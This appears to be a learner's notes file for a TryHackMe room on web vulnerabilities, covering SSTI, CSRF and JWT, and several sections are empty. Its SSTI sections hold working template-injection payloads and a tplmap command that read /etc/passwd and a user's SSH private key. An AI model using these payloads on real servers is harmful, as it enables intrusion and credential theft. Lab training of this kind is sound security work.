# Room
https://tryhackme.com/room/zthobscurewebvulns

# Task 1 - Intro
The larger vulnerabilities in web applications are:
* SSTI
* CSRF
* JWT
* XXE

# Task 2 - Methodology
Sections

# Task 3 - SSTI - What is SSTI
SSTI - Server Side Template Injection.  Template engines allow developers to use static HTML pages with dynamic parts such as a username.  Different template engines have different injection payloads.

# Task 4 - SSTI - Manual exploitation of SSTI
Research
* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection

Examples
* Use cat to read the /etc/passwd
    ```
    {{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
    ```
* Use read to view test's SSH private key
    ```
    {{ ''.__class__.__mro__[2].__subclasses__()[40]()('/home/test/.ssh/id_rsa').read()}}
    ```

# Task 5 - SSTI - Automatic exploitation of SSTI
Tool to detect SSTI
* https://github.com/epinna/tplmap

Examples
* Grab /etc/passwd with a vulnerable parameter
    ```
    tplmap.py -u http://10.10.10.10:5000/ -d 'noot' --os-cmd 'cat /etc/passwd'
    ```

# Task 6 - SSTI - Challenge
Use SSTI to read /flag
```
{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}
```

# Task 7 - CSRF - What is CSRF
CSRF - Cross Site Request Forgery.  CSRF happens when a user visits a page on one site, but then an action is performed on a different site.

# Task 8 - CSRF - Manual Exploitation of CSRF
Example

# Task 9 - CSRF - Automatic Exploitation
Tool
* xsrfprobe for Python

Install
* pip3 instal xsrfprobe

Use
* xsrfprobe -u url/endpoint
    ```
    xsrfprobe

        XSRFProbe, A Cross Site Request Forgery Audit Toolkit

    usage: xsrfprobe -u <url> <args>

    Required Arguments:
    -u URL, --url URL     Main URL to test

    Optional Arguments:
    -c COOKIE, --cookie COOKIE
                            Cookie value to be requested with each successive request. If there are multiple cookies, separate them with commas. For example: `-c
                            PHPSESSID=i837c5n83u4, _gid=jdhfbuysf`.
    -o OUTPUT, --output OUTPUT
                            Output directory where files to be stored. Default is the output/ folder where all files generated will be stored.
    -d DELAY, --delay DELAY
                            Time delay between requests in seconds. Default is zero.
    -q, --quiet           Set the DEBUG mode to quiet. Report only when vulnerabilities are found. Minimal output will be printed on screen.
    -H HEADERS, --headers HEADERS
                            Comma separated list of custom headers you'd want to use. For example: ``--headers "Accept=text/php, X-Requested-With=Dumb"``.
    -v, --verbose         Increase the verbosity of the output (e.g., -vv is more than -v).
    -t TIMEOUT, --timeout TIMEOUT
                            HTTP request timeout value in seconds. The entered value may be either in floating point decimal or an integer. Example: ``--timeout
                            10.0``
    -E EXCLUDE, --exclude EXCLUDE
                            Comma separated list of paths or directories to be excluded which are not in scope. These paths/dirs won't be scanned. For example:
                            `--exclude somepage/, sensitive-dir/, pleasedontscan/`
    --user-agent USER_AGENT
                            Custom user-agent to be used. Only one user-agent can be specified.
    --max-chars MAXCHARS  Maximum allowed character length for the custom token value to be generated. For example: `--max-chars 5`. Default value is 6.
    --crawl               Crawl the whole site and simultaneously test all discovered endpoints for CSRF.
    --no-analysis         Skip the Post-Scan Analysis of Tokens which were gathered during requests
    --malicious           Generate a malicious CSRF Form which can be used in real-world exploits.
    --skip-poc            Skip the PoC Form Generation of POST-Based Cross Site Request Forgeries.
    --no-verify           Do not verify SSL certificates with requests.
    --display             Print out response headers of requests while making requests.
    --update              Update XSRFProbe to latest version on GitHub via git.
    --random-agent        Use random user-agents for making requests.
    --version             Display the version of XSRFProbe and exit.
    ```

# Task 10 - CSRF - Challenge
Challenge

# Task 11 - JWT - Intro
JWT = JSON Web Token.  A very secure method of authentication if done right.  JWT makeup: header.payload.secret.  The secret is only known to the server.  The JWT is base64 encoded.  If you control the secret you can control the data.

# Task 12 - JWT - Manual JWT Exploitation
Example

# Task 13 - JWT - Automatic JWT Exploitation
Example

# Task 14 - JWT - Challenge
